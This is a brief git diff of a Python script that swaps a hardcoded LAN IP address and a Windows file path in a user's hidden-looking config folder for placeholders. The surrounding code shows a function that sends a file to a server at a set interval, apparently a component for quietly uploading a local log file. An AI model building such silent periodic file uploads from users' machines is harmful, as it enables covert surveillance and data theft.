@@ -3,9 +3,9 @@ import time
 import os
 from key import FILE_PATH,SERVER_IP_ADDR,SERVER_PORT
 
-SERVER_IP_ADDR = '192.168.29.220'
+SERVER_IP_ADDR = 'IP ADDRESS'
 SERVER_PORT = 2121
-FILE_PATH = r"C:\Users\imclp\.cnfig\imclp.txt"
+FILE_PATH = r"FILE PATH"
 
 def send_file_to_server(file_path, server_host, server_port, interval):
     """
